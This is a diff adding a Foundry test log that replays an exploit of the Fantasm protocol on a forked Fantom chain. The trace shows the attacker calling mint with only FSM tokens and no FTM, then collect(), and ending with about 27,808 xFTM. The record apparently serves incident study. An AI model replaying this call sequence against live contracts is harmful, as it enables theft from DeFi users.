@@ -1,0 +1,95 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/Fantasm_exp.sol:ContractTest
+[PASS] testExploit() (gas: 239299)
+Logs:
+  Before exploit, xFTM  balance of attacker:: 0
+  After exploit, xFTM  balance of attacker:: 27808380491957617661247
+
+Traces:
+  [5795] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("fantom", 32971742 [3.297e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [304389] ContractTest::testExploit()
+    ├─ [0] VM::prank(0x9362e8cF30635de48Bdf8DA52139EEd8f1e5d400)
+    │   └─ ← [Return]
+    ├─ [29927] 0xaa621D2002b5a6275EF62d7a065A865167914801::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100000000000000000000 [1e20])
+    │   ├─ emit Transfer(from: 0x9362e8cF30635de48Bdf8DA52139EEd8f1e5d400, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 100000000000000000000 [1e20])
+    │   ├─  storage changes:
+    │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x0000000000000000000000000000000000000000000000056bc75e2d63100000
+    │   │   @ 0x05ab60b44e747a21acc9ca6870d14709fbce0c7a6dfee1cda7602a72bc8f242e: 0x0000000000000000000000000000000000000000000003556e2a8c483e6533a9 → 0x00000000000000000000000000000000000000000000035002632e1adb5533a9
+    │   └─ ← [Return] true
+    ├─ [2563] 0xfBD2945D3601f21540DDD85c29C5C3CaF108B96F::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_uint(key: "Before exploit, xFTM  balance of attacker:", val: 0)
+    ├─ [24671] 0xaa621D2002b5a6275EF62d7a065A865167914801::approve(0x880672AB1d46D987E5d663Fc7476CD8df3C9f937, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x880672AB1d46D987E5d663Fc7476CD8df3C9f937, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─  storage changes:
+    │   │   @ 0x7a05034c23daddde0be2fb63f68a273465a472108fdf7514fba8f2d86b281d72: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   └─ ← [Return] true
+    ├─ [179579] 0x880672AB1d46D987E5d663Fc7476CD8df3C9f937::mint(100000000000000000000 [1e20], 1)
+    │   ├─ [26687] 0x022Fc3e5Df5D474EC1b40dBB83Bd71C23fb8C664::getFantasmPrice() [staticcall]
+    │   │   ├─ [19164] 0x33Dbc435Ff3EC866D4D95bce35695943AF3d074b::spot(0xaa621D2002b5a6275EF62d7a065A865167914801, 1000000000000000000 [1e18]) [staticcall]
+    │   │   │   ├─ [2381] 0x457C8Efcd523058dd58CF080533B41026788eCee::token0() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83
+    │   │   │   ├─ [2357] 0x457C8Efcd523058dd58CF080533B41026788eCee::token1() [staticcall]
+    │   │   │   │   └─ ← [Return] 0xaa621D2002b5a6275EF62d7a065A865167914801
+    │   │   │   ├─ [2504] 0x457C8Efcd523058dd58CF080533B41026788eCee::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 149205992919465784419412 [1.492e23], 28154779301291522535051 [2.815e22], 1646838729 [1.646e9]
+    │   │   │   ├─ [2359] 0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83::decimals() [staticcall]
+    │   │   │   │   └─ ← [Return] 18
+    │   │   │   ├─ [223] 0xaa621D2002b5a6275EF62d7a065A865167914801::decimals() [staticcall]
+    │   │   │   │   └─ ← [Return] 18
+    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000498b92c60823a8d1
+    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000498b92c60823a8d1
+    │   ├─ [2371] 0xfBD2945D3601f21540DDD85c29C5C3CaF108B96F::totalSupply() [staticcall]
+    │   │   └─ ← [Return] 4842218102039040682113876 [4.842e24]
+    │   ├─ [2401] 0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83::deposit()
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   ├─ [25632] 0xaa621D2002b5a6275EF62d7a065A865167914801::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x880672AB1d46D987E5d663Fc7476CD8df3C9f937, 100000000000000000000 [1e20])
+    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x880672AB1d46D987E5d663Fc7476CD8df3C9f937, value: 100000000000000000000 [1e20])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000000056bc75e2d63100000 → 0
+    │   │   │   @ 0x27030ed2b061c6aab72cf9cb26412ca475645bd6b8a4aa3225d097f7d736c51b: 0 → 0x0000000000000000000000000000000000000000000000056bc75e2d63100000
+    │   │   └─ ← [Return] true
+    │   ├─ [7728] 0xaa621D2002b5a6275EF62d7a065A865167914801::burn(100000000000000000000 [1e20])
+    │   │   ├─ emit Transfer(from: 0x880672AB1d46D987E5d663Fc7476CD8df3C9f937, to: 0x0000000000000000000000000000000000000000, value: 100000000000000000000 [1e20])
+    │   │   ├─  storage changes:
+    │   │   │   @ 2: 0x000000000000000000000000000000000000000000002533816f555192533a53 → 0x00000000000000000000000000000000000000000000252e15a7f7242f433a53
+    │   │   │   @ 0x27030ed2b061c6aab72cf9cb26412ca475645bd6b8a4aa3225d097f7d736c51b: 0x0000000000000000000000000000000000000000000000056bc75e2d63100000 → 0
+    │   │   └─ ← [Stop]
+    │   ├─ [12998] 0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83::transfer(0xc92fD79306f6D7cfbF7A85e7DDa58D4a75ac5b10, 82086322756099567479 [8.208e19])
+    │   │   ├─ emit Transfer(from: 0x880672AB1d46D987E5d663Fc7476CD8df3C9f937, to: 0xc92fD79306f6D7cfbF7A85e7DDa58D4a75ac5b10, value: 82086322756099567479 [8.208e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x27030ed2b061c6aab72cf9cb26412ca475645bd6b8a4aa3225d097f7d736c51b: 0x000000000000000000000000000000000000000000000018151194af345980dc → 0x000000000000000000000000000000000000000000000013a1e4610cb8f89165
+    │   │   │   @ 0xc460757e5920a323ce99b13d68d58202ac4d1577b4e99591b9540b268fdb914f: 0x000000000000000000000000000000000000000000001bcbfc79b964374cae40 → 0x000000000000000000000000000000000000000000001bd06fa6ed06b2ad9db7
+    │   │   └─ ← [Return] true
+    │   ├─ emit Mint(minter: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 27808380491957617661247 [2.78e22], ftmIn: 0, fantasmIn: 100000000000000000000 [1e20], fee: 82086322756099567479 [8.208e19])
+    │   ├─  storage changes:
+    │   │   @ 0xed79f5a6103cc2504e2b88abca652130eac5b790c6ddb9e498c6f724905db5d9: 0 → 0x0000000000000000000000000000000000000000000005e37ecdc2523431953f
+    │   │   @ 8: 0 → 0x0000000000000000000000000000000000000000000005e37ecdc2523431953f
+    │   │   @ 0xed79f5a6103cc2504e2b88abca652130eac5b790c6ddb9e498c6f724905db5dc: 0 → 0x0000000000000000000000000000000000000000000000000000000001f71bde
+    │   └─ ← [Stop]
+    ├─ [0] VM::roll(32971743 [3.297e7])
+    │   └─ ← [Return]
+    ├─ [37264] 0x880672AB1d46D987E5d663Fc7476CD8df3C9f937::collect()
+    │   ├─ [27845] 0xfBD2945D3601f21540DDD85c29C5C3CaF108B96F::mint(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 27808380491957617661247 [2.78e22])
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 27808380491957617661247 [2.78e22])
+    │   │   ├─  storage changes:
+    │   │   │   @ 2: 0x0000000000000000000000000000000000000000000401612b56d978ce7c3b54 → 0x000000000000000000000000000000000000000000040744aa249bcb02add093
+    │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x0000000000000000000000000000000000000000000005e37ecdc2523431953f
+    │   │   └─ ← [Stop]
+    │   ├─  storage changes:
+    │   │   @ 0xed79f5a6103cc2504e2b88abca652130eac5b790c6ddb9e498c6f724905db5d9: 0x0000000000000000000000000000000000000000000005e37ecdc2523431953f → 0
+    │   │   @ 8: 0x0000000000000000000000000000000000000000000005e37ecdc2523431953f → 0
+    │   └─ ← [Stop]
+    ├─ [563] 0xfBD2945D3601f21540DDD85c29C5C3CaF108B96F::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 27808380491957617661247 [2.78e22]
+    ├─ emit log_named_uint(key: "After exploit, xFTM  balance of attacker:", val: 27808380491957617661247 [2.78e22])
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.01s (5.82s CPU time)
+
+Ran 1 test suite in 9.33s (7.01s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
